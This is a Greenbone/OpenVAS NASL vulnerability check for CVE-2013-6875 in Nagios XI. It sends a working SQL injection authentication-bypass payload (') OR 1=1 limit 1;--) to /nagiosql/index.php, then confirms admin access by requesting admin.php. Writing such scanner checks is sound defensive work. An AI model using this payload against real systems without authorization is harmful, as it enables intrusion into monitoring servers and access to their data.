# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:nagios:nagios_xi";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103842");
  script_tag(name:"last_modification", value:"2023-11-24 16:09:32 +0000 (Fri, 24 Nov 2023)");
  script_tag(name:"creation_date", value:"2013-12-02 10:28:47 +0100 (Mon, 02 Dec 2013)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("2023-11-24T16:09:32+0000");

  script_cve_id("CVE-2013-6875");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Nagios XI SQLi Vulnerability (Dec 2013) - Active Check");

  script_category(ACT_ATTACK);

  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_nagios_xi_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("nagios/nagios_xi/http/detected");

  script_tag(name:"summary", value:"Nagios XI is prone to an SQL injection (SQLi) vulnerability
  because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.");

  script_tag(name:"vuldetect", value:"Sends multiple HTTP requests and checks the responses");

  script_tag(name:"insight", value:"It's possible to bypass authentication in
  '/nagiosql/index.php'.");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent vulnerabilities in the underlying
  database.");

  script_tag(name:"affected", value:"Nagios XI prior to version 2012R2.4.");

  script_tag(name:"solution", value:"See the referenced advisory for a solution.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/63754");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if (!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

dir = "/nagiosql"; # nb: Use the location from above?

url = dir + "/index.php";
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if (!buf || "tfPassword" >!< buf)
  exit(0);

cookie = eregmatch(pattern:'Set-Cookie: ([^\r\n]+)', string: buf);
if (isnull(cookie[1]))
  exit(0);

useragent = http_get_user_agent();
host = http_host_name(port:port);

co = cookie[1];

vt_strings = get_vt_strings();

bypass = "tfUsername=" + vt_strings["default"] + "&tfPassword=%27)%20OR%201%3D1%20limit%201%3B--%20&Submit=Login";
len = strlen(bypass);

req = 'POST ' + dir + '/index.php HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'Content-Length: ' + len + '\r\n' +
      'Origin: http://' + host + '\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
      'Referer: http://' + host + dir + '\r\n' +
      'Cookie: ' + co + '\r\n' +
      '\r\n' +
      bypass;
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if (!res || res !~ "^HTTP/1\.[01] 302")
  exit(0);

req = 'GET ' + dir + '/admin.php HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'User-Agent: ' + useragent + '\r\n' +
      'Referer: http://' + host + dir + '\r\n' +
      'Cookie: ' + co + '\r\n' +
      '\r\n';
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if (res =~ "^HTTP/1\.[01] 200" && "Core Config Manager" >< res && "nagiosadmin" >< res && ">Logout<" >< res) {
  security_message(port:port);
  exit(0);
}

exit(99);
